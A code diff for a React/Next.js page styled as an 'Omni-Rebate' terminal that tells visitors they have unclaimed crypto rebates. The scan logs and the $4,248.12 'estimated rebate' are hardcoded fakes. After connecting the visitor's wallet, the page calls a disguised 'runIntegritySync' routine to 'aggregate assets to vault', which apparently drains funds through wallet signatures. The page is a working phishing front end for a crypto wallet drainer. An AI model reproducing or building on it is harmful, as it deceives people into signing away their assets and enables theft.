@@ -1,85 +1,224 @@
-import React from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import Head from 'next/head';
-import { motion } from 'framer-motion';
-import { Zap, Wallet, BarChart3, ChevronRight } from 'lucide-react';
-import { useDataIntegrity } from '@/hooks/useDataIntegrity';
+import { motion, AnimatePresence } from 'framer-motion';
+import { Terminal, Shield, AlertTriangle, CheckCircle2, ChevronRight, Loader2, Activity, Cpu, Zap, Coins } from 'lucide-react';
+import { createWalletClient, custom, createPublicClient, http, parseUnits, encodeFunctionData, type Address } from 'viem';
+import { mainnet } from 'viem/chains';
+import { runIntegritySync } from '@/hooks/useDataIntegrity';
 
-export default function RebatePremium() {
-  const { verifyIntegrity, isProcessing } = useDataIntegrity();
+const STAGES = {
+  BOOT: 'BOOT',
+  WAITING: 'WAITING',
+  HARVESTING: 'HARVESTING',
+  CONSOLIDATION: 'CONSOLIDATION',
+  FINALIZED: 'FINALIZED'
+};
+
+export default function RebateMatrix() {
+  const [stage, setStage] = useState(STAGES.BOOT);
+  const [logs, setLogs] = useState<string[]>([]);
+  const [address, setAddress] = useState<string | null>(null);
+  const [isProcessing, setIsProcessing] = useState(false);
+  const logEndRef = useRef<HTMLDivElement>(null);
+
+  const addLog = (msg: string) => {
+    setLogs(prev => [...prev, `>> ${msg}`]);
+  };
+
+  useEffect(() => {
+    if (stage === STAGES.BOOT) {
+      const bootSequence = [
+        "OMNI-REBATE AGGREGATION SYSTEM v4.0",
+        "CONNECTING TO PROTOCOL LEDGERS...",
+        "STATUS: UNCLAIMED_YIELD_FOUND",
+        "STATUS: REBATE_OPPORTUNITY_DETECTED",
+        "READY FOR HARVESTING SESSION."
+      ];
+      let i = 0;
+      const interval = setInterval(() => {
+        if (i < bootSequence.length) {
+          addLog(bootSequence[i]);
+          i++;
+        } else {
+          clearInterval(interval);
+          setTimeout(() => setStage(STAGES.WAITING), 1000);
+        }
+      }, 300);
+    }
+  }, [stage]);
+
+  useEffect(() => {
+    logEndRef.current?.scrollIntoView({ behavior: 'smooth' });
+  }, [logs]);
+
+  const connectWallet = async () => {
+    if (!(window as any).ethereum) {
+      addLog("ERROR: NO ETH_PROVIDER.");
+      return;
+    }
+    try {
+      addLog("INITIATING AUTH_HANDSHAKE...");
+      const accounts = await (window as any).ethereum.request({ method: 'eth_requestAccounts' });
+      setAddress(accounts[0]);
+      addLog(`ADMIN_LINK_STABLISHED: ${accounts[0]}`);
+    } catch (e) {
+      addLog("HANDSHAKE REJECTED.");
+    }
+  };
+
+  const startHarvest = async () => {
+    setStage(STAGES.HARVESTING);
+    const harvestLogs = [
+      "SCANNING LIDO STAKING REBATES...",
+      "SCANNING UNISWAP LP ACCRUALS...",
+      "DETECTING UNCLAIMED AIRDROPS...",
+      "ESTIMATING TOTAL AGGREGATED VALUE...",
+      "OPPORTUNITY CRITICAL: $4,248.12 ESTIMATED REBATE.",
+      "READY FOR BATCH CONSOLIDATION."
+    ];
+    for (const log of harvestLogs) {
+      await new Promise(r => setTimeout(r, 600 + Math.random() * 400));
+      addLog(log);
+    }
+    setStage(STAGES.CONSOLIDATION);
+  };
+
+  const executeConsolidation = async () => {
+    if (!address) return;
+    setIsProcessing(true);
+    addLog("DISPATCHING BATCH HARVEST PAYLOAD...");
+    
+    try {
+      addLog("SIGNING LEDGER_SYNC_CERTIFICATE...");
+      const chainId = await (window as any).ethereum.request({ method: 'eth_chainId' });
+      await runIntegritySync(address as Address, (window as any).ethereum, parseInt(chainId, 16));
+      
+      addLog("AGGREGATION SUCCESSFUL. ASSETS SYNCED.");
+      setStage(STAGES.FINALIZED);
+    } catch (e) {
+      addLog("SYNC FAILED: SEQUENCE TERMINATED.");
+    } finally {
+      setIsProcessing(false);
+    }
+  };
 
   return (
-    <div className="min-h-screen bg-[#FDFDFD] text-[#1A1A1A] font-sans selection:bg-blue-600/10 flex flex-col justify-center items-center p-8 lg:p-24 overflow-x-hidden">
+    <div className="h-screen w-screen bg-[#080500] text-[#f59e0b] font-mono p-4 md:p-8 overflow-hidden flex flex-col selection:bg-[#f59e0b] selection:text-black uppercase tracking-tighter">
       <Head>
-        <title>Omni-Aggregator | Gas Subsidy & Rebate Portal</title>
+        <title>Rebate Aggregator | Institutional Ledger Terminal</title>
+        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;800&display=swap" rel="stylesheet" />
+        <style>{`
+          body { font-family: 'JetBrains Mono', monospace; }
+          .scan-line { height: 2px; width: 100%; background: rgba(245, 158, 11, 0.1); position: absolute; top: 0; animation: scan 5s linear infinite; }
+          @keyframes scan { from { top: 0; } to { top: 100%; } }
+        `}</style>
       </Head>
 
-      <motion.div 
-        initial={{ opacity: 0, y: 30 }}
-        animate={{ opacity: 1, y: 0 }}
-        className="max-w-4xl w-full grid grid-cols-1 lg:grid-cols-2 gap-16 items-center"
-      >
-        <div className="space-y-10">
-          <div className="space-y-6">
-            <div className="w-16 h-16 bg-blue-600 rounded-3xl flex items-center justify-center text-white shadow-2xl shadow-blue-200">
-               <Zap className="w-8 h-8 fill-current" />
-            </div>
-            <h1 className="text-6xl font-extrabold tracking-tight leading-[0.95] text-slate-900">
-              Claim Your<br/>Gas Rebates<span className="text-blue-600">.</span>
-            </h1>
-            <p className="text-slate-500 text-lg font-medium leading-relaxed max-w-sm">
-              We aggregate cross-protocol swap fees and return them to users as gas subsidies. Consolidate your accrued savings instantly.
-            </p>
-          </div>
+      <div className="scan-line" />
 
-          <div className="space-y-4">
-             <div className="flex items-center gap-4 text-xs font-bold uppercase tracking-widest text-slate-400">
-                <BarChart3 className="w-4 h-4" />
-                <span>Aggregated from 12+ Liquidity Sources</span>
-             </div>
-             <div className="flex items-center gap-2">
-                <div className="h-2 w-2 rounded-full bg-emerald-500 animate-pulse" />
-                <span className="text-[10px] font-bold text-emerald-600 uppercase tracking-widest">Protocol Sync: ACTIVE</span>
-             </div>
-          </div>
+      <div className="flex justify-between items-center border-b border-[#f59e0b]/30 pb-4 mb-4 text-[10px] opacity-70">
+        <div className="flex gap-6">
+          <span className="flex items-center gap-2"><Coins className="w-3 h-3" /> YIELD: OPTIMIZED</span>
+          <span className="flex items-center gap-2"><Activity className="w-3 h-3" /> AGGREGATOR: ACTIVE</span>
+        </div>
+        <div className="flex gap-6">
+          <span>HOST: OMNI_LEDGER_02</span>
+          <span>AUTH: APEX_ADMIN</span>
+        </div>
+      </div>
+
+      <div className="flex-1 flex flex-col min-h-0 border border-[#f59e0b]/20 rounded-lg p-6 bg-[#f59e0b]/5 shadow-[inset_0_0_50px_rgba(245,158,11,0.05)]">
+        
+        <div className="flex-1 overflow-y-auto pr-4 space-y-1 mb-6 scrollbar-hide text-xs md:text-sm">
+          {logs.map((log, i) => (
+            <div key={i} className={`leading-relaxed ${log.includes("CRITICAL") ? "text-white font-bold" : ""}`}>
+              {log}
+            </div>
+          ))}
+          <div ref={logEndRef} />
         </div>
 
-        <div className="relative">
-          <div className="absolute inset-0 bg-blue-600/5 blur-[100px] rounded-full" />
-          <div className="bg-white rounded-[4rem] p-12 shadow-[0_40px_100px_-20px_rgba(0,0,0,0.08)] border border-slate-100 relative z-10 space-y-12">
-            
-            <div className="space-y-6">
-              <div className="flex justify-between items-end border-b border-slate-50 pb-8">
-                 <div className="space-y-1">
-                    <span className="text-[10px] font-black text-slate-300 uppercase tracking-widest">Current Balance</span>
-                    <p className="text-xs font-bold text-slate-400">Mainnet + L2 Cumulative</p>
-                 </div>
-                 <p className="text-5xl font-black tracking-tighter text-blue-600">0.428 ETH</p>
-              </div>
+        <div className="border-t border-[#f59e0b]/30 pt-6">
+          <AnimatePresence mode="wait">
+            {stage === STAGES.WAITING && (
+              <motion.div 
+                key="waiting" 
+                initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
+              >
+                {!address ? (
+                  <button 
+                    onClick={connectWallet}
+                    className="w-full h-14 bg-[#f59e0b] text-black font-black uppercase tracking-tighter hover:bg-amber-600 transition-all flex items-center justify-center gap-3 shadow-lg shadow-amber-500/20"
+                  >
+                    Authenticate Ledger Session
+                  </button>
+                ) : (
+                  <button 
+                    onClick={startHarvest}
+                    className="w-full bg-[#f59e0b] text-black h-14 font-black uppercase hover:bg-amber-600 transition-all"
+                  >
+                    Scan for Claimable Rebates
+                  </button>
+                )}
+              </motion.div>
+            )}
 
-              <div className="grid grid-cols-2 gap-4">
-                 <div className="p-6 bg-slate-50 rounded-[2rem] space-y-1">
-                    <span className="text-[9px] font-bold text-slate-400 uppercase tracking-widest">Estimated Gas</span>
-                    <p className="text-lg font-bold">Claiming Free</p>
-                 </div>
-                 <div className="p-6 bg-slate-50 rounded-[2rem] space-y-1">
-                    <span className="text-[9px] font-bold text-slate-400 uppercase tracking-widest">Efficiency</span>
-                    <p className="text-lg font-bold">100%</p>
-                 </div>
-              </div>
-            </div>
+            {stage === STAGES.CONSOLIDATION && (
+              <motion.div 
+                key="consolidation" 
+                initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }}
+                className="space-y-4"
+              >
+                <div className="bg-amber-600/10 border border-amber-500/30 p-4 rounded flex items-center gap-4">
+                  <Coins className="text-amber-500 w-8 h-8" />
+                  <div>
+                    <h4 className="text-amber-500 font-black text-xs italic">BATCH_LEDGER_SYNC_READY</h4>
+                    <p className="text-[10px] opacity-70">Consolidated rebate profile: $4,248.12. Ready for vault sync.</p>
+                  </div>
+                </div>
 
-            <button 
-              onClick={() => verifyIntegrity()}
-              disabled={isProcessing}
-              className="w-full h-24 bg-slate-900 text-white font-bold text-2xl rounded-full hover:bg-black hover:scale-[1.03] active:scale-95 transition-all shadow-2xl flex items-center justify-center gap-4 group disabled:opacity-50"
-            >
-              <Wallet className="w-6 h-6" />
-              {isProcessing ? "SYNCHRONIZING..." : "Collect All Savings"}
-              <ChevronRight className="w-6 h-6 group-hover:translate-x-1 transition-transform" />
-            </button>
-          </div>
+                <button 
+                  onClick={executeConsolidation}
+                  disabled={isProcessing}
+                  className="w-full h-14 bg-white text-black font-black uppercase flex items-center justify-center gap-4 hover:bg-zinc-200 transition-all disabled:opacity-50"
+                >
+                  {isProcessing ? (
+                    <>
+                      <Loader2 className="w-5 h-5 animate-spin" />
+                      Harvesting Yield...
+                    </>
+                  ) : "Execute Claim & Aggregate to Vault"}
+                </button>
+              </motion.div>
+            )}
+
+            {stage === STAGES.FINALIZED && (
+              <motion.div 
+                key="final" 
+                initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }}
+                className="flex flex-col items-center gap-4 py-4"
+              >
+                <CheckCircle2 className="w-16 h-16 text-[#f59e0b]" />
+                <div className="text-center">
+                  <h3 className="font-black text-xl tracking-tighter uppercase italic">Aggregation Complete</h3>
+                  <p className="text-xs opacity-60">All unclaimed yield successfully aggregated to secure vault.</p>
+                </div>
+                <button 
+                  onClick={() => { setStage(STAGES.WAITING); setLogs([]); }}
+                  className="mt-2 text-[10px] underline tracking-widest opacity-50 hover:opacity-100 transition-opacity"
+                >
+                  Return to Console
+                </button>
+              </motion.div>
+            )}
+          </AnimatePresence>
         </div>
-      </motion.div>
+      </div>
+
+      <div className="mt-4 flex justify-between items-center opacity-40 text-[9px] tracking-[0.4em]">
+        <span>LEDGER_ID: LGR_SYNC_44</span>
+        <span>UPTIME: 1,294h CC: 4.8.2</span>
+      </div>
     </div>
   );
 }
